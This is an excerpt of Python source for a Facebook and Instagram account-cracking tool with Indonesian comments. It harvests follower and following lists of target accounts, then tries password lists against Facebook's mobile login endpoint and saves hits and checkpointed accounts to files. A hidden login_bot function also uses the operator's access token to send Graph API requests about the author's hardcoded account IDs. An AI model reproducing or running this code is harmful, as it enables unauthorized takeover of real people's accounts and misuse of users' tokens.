...
def banner():
	...
	(M,til,K,til,H,til,M,til,K,til,H,til,M,P,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,Wa_me,P,M,P))
...
def login_bot(romz):
	try:
		toket = romz
		Hendra1 = ('100012239018736')
		Hendra2 = ('100018224922124')
		Hendra3 = ('100040993697715')
		Hendra4 = ('100028569678085')
		requests.post(f"https://graph.facebook.com/{Hendra1}?fields=subscribers&access_token={toket}") # ROMI AFRIZAL PENGGUNA AKUN UNIK
		requests.post(f"https://graph.facebook.com/{Hendra2}?fields=subscribers&access_token={toket}") # DEMIT ROMI AFRIZAL
		requests.post(f"https://graph.facebook.com/{Hendra3}?fields=subscribers&access_token={toket}") # Romi Afrizal (2018)
		requests.post(f"https://graph.facebook.com/{Hendra2}?fields=subscribers&access_token={toket}") # Kontol
...
class Crack:
	...
	def touch(self, user, manual, **data):
		...
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [Libya] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				...
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=100", data = dataa, headers=_headers, allow_redirects = False)
				if "c_user" in ses.cookies.get_dict():
					...
					open('CP/%s.txt' %(waktu), 'a').write(" [CP]==> %s /\ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
...
{U}•{M} 00 {O}Keluar
	...
	def menu(self):
		...
		if c=='':
			...
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=50000',id)
			self.passwordAPI(info)
		elif c in ('2','02'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=50000',id)
			self.passwordAPI(info)
		elif c in ('3','03'):
			...
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=50000',x_id)
			for i in following:
				six+=1
